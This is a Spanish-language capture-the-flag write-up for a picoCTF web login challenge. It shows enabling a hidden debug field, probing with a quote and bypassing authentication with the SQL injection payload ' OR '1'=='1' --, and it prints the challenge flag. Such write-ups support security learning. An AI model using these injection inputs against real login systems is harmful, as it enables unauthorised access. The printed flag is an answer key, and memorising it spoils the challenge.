## Objetivo:
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

**Hints:**
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

## Solución:
1. Al inspeccionar la página de inicio de sesión, podemos encontrar que hay un campo del formulario oculto llamado `debug`. por lo tanto lo establecemos en 1:

```html
<input type="hidden" name="debug" value="0">

<input type="hidden" name="debug" value="1">
```

2. Al establecer el valor en `1`  e ingresar algún nombre de usuario y contraseña muestra:

```txt
username: admin
password: 12134
SQL query: SELECT * FROM users WHERE name='admin' AND password='12134'

Login failed.
```

3. Observamos la consulta SQL. Establecer el nombre de usuario en una comilla simple (') e iniciar sesión da como resultado:

```txt
username: '
password: 12134
SQL query: SELECT * FROM users WHERE name=''' AND password='12134'
```

4. Al revisar la actividad de la red muestra un código de retorno de 500: Error interno del servidor. Esto indica la ausencia de un filtrado SQL adecuado. Una simple inyección SQL de `' OR '1'=='1' --` obtenemos la bandera:

```txt
username: ' OR '1'=='1' --
password: 1234
SQL query: SELECT * FROM users WHERE name='' OR '1'=='1' --' AND password='1234'

Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```

### Flag: picoCTF{s0m3_SQL_fb3fe2ad}

## Notas adicionales:

### SQL Injection:
La inyección SQL es una técnica de inyección de código que podría destruir su base de datos. La inyección SQL es una de las técnicas de piratería web más comunes. La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.

## Referencias:
- https://www.w3schools.com/sql/sql_injection.asp